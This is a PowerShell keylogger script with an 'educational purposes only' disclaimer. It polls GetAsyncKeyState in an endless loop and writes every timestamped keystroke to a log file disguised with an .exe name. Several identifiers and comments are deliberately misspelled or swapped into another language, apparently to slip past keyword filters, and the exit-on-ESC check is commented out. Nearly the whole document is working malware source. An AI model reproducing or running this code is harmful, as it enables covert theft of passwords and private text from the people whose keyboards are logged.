#This is for edu purposes only
#
#
#Dont do dumb things
#
#
#Written by: anon
#
#
# Define file path
$logFile = "C:\logs\trustmebro.exe"

# Ensure C:\log directory exists; else create it
if (-not (Test-Path "C:\logs")) {
    New-Item -ItemType Directory -Path "C:\logs"
}

# Add Windows API funcs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Start
Write-Output "`n`n[FOR EDUCATIONAL PURPOSES ONLY!] `n`nGathering started, see C:\logs for result `nPress ctrl+c to stop."

# table to map virtual sleutel codes to karakters
$SleutelMap = @{
    65 = 'a'; 66 = 'b'; 67 = 'c'; 68 = 'd'; 69 = 'e'; 70 = 'f'; 71 = 'g';
    72 = 'h'; 73 = 'i'; 74 = 'j'; 75 = 'k'; 76 = 'l'; 77 = 'm'; 78 = 'n';
    79 = 'o'; 80 = 'p'; 81 = 'q'; 82 = 'r'; 83 = 's'; 84 = 't'; 85 = 'u';
    86 = 'v'; 87 = 'w'; 88 = 'x'; 89 = 'y'; 90 = 'z';
    48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6';
    55 = '7'; 56 = '8'; 57 = '9';
    32 = ' '; 13 = '[ENTER]'; 8 = '[BACKSPACE]'; 9 = '[TAB]';
    27 = '[ESC]'; 20 = '[CAPSLOCK]'; 160 = '[SHIFT]'; 161 = '[SHIFT]';
    162 = '[CTRL]'; 163 = '[CTRL]'; 164 = '[ALT]'; 165 = '[ALT]';
    91 = '[WIN]'; 92 = '[WIN]';
}

# table to map number sleutels to their respective special characters when Sh!ft is pressed
$shiftSymbols = @{
    48 = ')'; 49 = '!'; 50 = '@'; 51 = '#'; 52 = '$'; 53 = '%'; 
    54 = '^'; 55 = '&'; 56 = '*'; 57 = '('
}

# St2rt ver zammel loop
while ($true) {
    # Check if Sh7ft is pressed
    $isShiftPressed = ([User32]::GetAsyncKeyState(160) -lt 0) -or ([User32]::GetAsyncKeyState(161) -lt 0)

    # Loop through ASCII values for readable characters (8-255)
    for ($i = 8; $i -le 255; $i++) {
        $state = [User32]::GetAsyncKeyState($i)

        if ($state -eq -32767) {
            # If the key is in the hash table, use the mapped character
            if ($SleutelMap.ContainsKey($i)) {
                # Handle shift combinations
                if ($isShiftPressed) {
                    if ($shiftSymbols.ContainsKey($i)) {
                        $key = $shiftSymbols[$i]  # Special characters for number keys
                    } elseif ($i -ge 65 -and $i -le 90) {
                        $key = $SleutelMap[$i].ToUpper()  # Convert letter to uppercase
                    } else {
                        $key = $SleutelMap[$i]
                    }
                } else {
                    $key = $SleutelMap[$i]
                }
            } else {
                $key = "[UNK-$i]"
            }

            # Write the sleutels to the file with timestamp
            $entry = "$(Get-Date) - $key"
            Write-Output "entry: $entry"  # Output to console for confirmation

            try {
                Add-Content -Path $logFile -Value $entry
                Write-Output "wrote to log."
            } catch {
                Write-Output "Failed to write to log. Error: $_"
                exit
            }
        }
    }

    # Small delay to reduce CPU usage (slows the gathering)
    # Start-Sleep -Milliseconds 100

    # Exit the script with ESC key
    #if ([User32]::GetAsyncKeyState(27) -ne 0) {
    #    Write-Output "Gathering stopped."
    #    break
    #}
}
